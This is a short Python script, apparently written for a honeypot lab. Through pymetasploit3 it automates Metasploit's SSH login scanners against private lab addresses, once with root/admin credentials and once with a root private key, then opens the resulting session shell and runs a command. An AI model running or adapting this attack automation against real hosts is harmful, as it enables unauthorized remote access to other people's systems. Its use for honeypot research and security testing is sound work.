# msf> load msgrpc Pass=test111

#[*] MSGRPC Service:  127.0.0.1:55552 
#[*] MSGRPC Username: msf
#[*] MSGRPC Password: T5X5iBLk
#[*] Successfully loaded plugin: msgrpc

from pymetasploit3.msfrpc import MsfRpcClient
import time

passwd = 'test111'
client = MsfRpcClient(passwd, port=55552)

# select exploit
cannypot = True

if cannypot:
    # Connecting to cannypot (cannypot1)
    print("###################### ssh login #######################")

    aux = client.modules.use('auxiliary', 'scanner/ssh/ssh_login')

    print(aux.description)
    print()
    print(aux.options)

    aux['RHOSTS'] = '10.0.1.1'
    aux['RPORT'] = '2222'
    aux['USERNAME'] = 'root'
    aux['VERBOSE'] = True
    aux['GatherProof'] = False
    aux['PASSWORD'] = 'admin'
    
    print("Missing options:", aux.missing_required)  # useful to check which mandatory option has not been set

    print("Execution of module", aux.execute())

else: 
    # Connecting to server (cannypot2)

    print("###################### ssh pubkey login #######################")

    aux = client.modules.use('auxiliary', 'scanner/ssh/ssh_login_pubkey')

    print(aux.description)
    print()
    print(aux.options)

    aux['RHOSTS'] = '10.0.1.2'
    aux['RPORT'] = '22'
    aux['USERNAME'] = 'root'
    aux['VERBOSE'] = True
    aux['GatherProof'] = False
    aux['KEY_PATH'] = '~/.ssh/id_rsa'

    print("Missing options:", aux.missing_required)  # useful to check which mandatory option has not been set

    print("Execution of module", aux.execute())


# Get session id

# Get all sessions
# Find all available sessions
print("Sessions availables:", list(client.sessions.list))

# TODO how to clean all sessions before running ssh_login?

# Get a shell object
print("Get shell", list(client.sessions.list)[-1])

shell = client.sessions.session(list(client.sessions.list)[-1])

time.sleep(10)

print("Reading prompt", shell.read())

time.sleep(10)

# Write to the shell
shell.write('uname -a')

# Print the output
print(shell.read())

# Stop the shell
shell.stop()
